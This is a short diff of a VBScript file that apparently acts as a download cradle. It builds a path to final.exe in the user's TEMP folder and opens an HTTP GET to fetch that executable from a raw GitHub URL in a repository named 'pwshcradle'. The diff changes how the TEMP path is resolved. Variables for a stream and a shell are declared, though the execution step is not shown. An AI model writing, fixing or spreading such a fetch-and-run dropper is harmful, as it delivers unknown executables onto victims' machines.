@@ -1,6 +1,6 @@
 Dim http, stream, shell, exePath
 
-exePath = Environ("TEMP") & "\final.exe"
+exePath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%") & "\final.exe"
 
 Set http = CreateObject("MSXML2.XMLHTTP")
 http.Open "GET", "https://raw.githubusercontent.com/Brothersextremegaming/pwshcradle/refs/heads/main/final.exe", False
